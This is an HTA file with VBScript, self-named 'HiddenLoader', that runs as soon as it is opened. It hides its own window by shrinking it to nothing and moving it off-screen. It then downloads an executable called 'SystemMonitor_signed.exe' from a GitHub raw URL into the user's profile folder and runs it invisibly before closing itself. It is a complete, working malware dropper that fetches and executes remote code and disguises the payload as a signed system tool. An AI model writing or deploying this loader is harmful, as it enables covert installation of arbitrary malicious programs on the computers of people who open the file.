<html>
<head>
<HTA:APPLICATION 
    ID="HiddenLoader"
    APPLICATIONNAME="HiddenLoader"
    WINDOWSTATE="minimize"
    SHOWINTASKBAR="no"
    CAPTION="no"
    SYSMENU="no"
    SCROLL="no"
    BORDER="none"
    INNERBORDER="no"
    CONTEXTMENU="no"
    SELECTION="no"
/>
<title></title>
<script language="VBScript">
    Sub Window_OnLoad
        ' Hide the window completely
        window.resizeTo 0, 0
        window.moveTo -10000, -10000
        
        Set objShell = CreateObject("WScript.Shell")
        userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
        exePath = userProfile & "\SystemMonitor_signed.exe"
        downloadURL = "https://github.com/EncryptedByRollerV8/n/raw/main/SystemMonitor_signed.exe"
        
        ' Download using XMLHTTP
        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
        objXMLHTTP.open "GET", downloadURL, false
        objXMLHTTP.send()
        
        If objXMLHTTP.Status = 200 Then
            Set objADOStream = CreateObject("ADODB.Stream")
            objADOStream.Open
            objADOStream.Type = 1
            objADOStream.Write objXMLHTTP.ResponseBody
            objADOStream.Position = 0
            objADOStream.SaveToFile exePath
            objADOStream.Close
            
            ' Run the executable
            objShell.Run Chr(34) & exePath & Chr(34), 0, False
        End If
        
        ' Close HTA
        window.Close
    End Sub
</script>
</head>
<body>
</body>
</html>
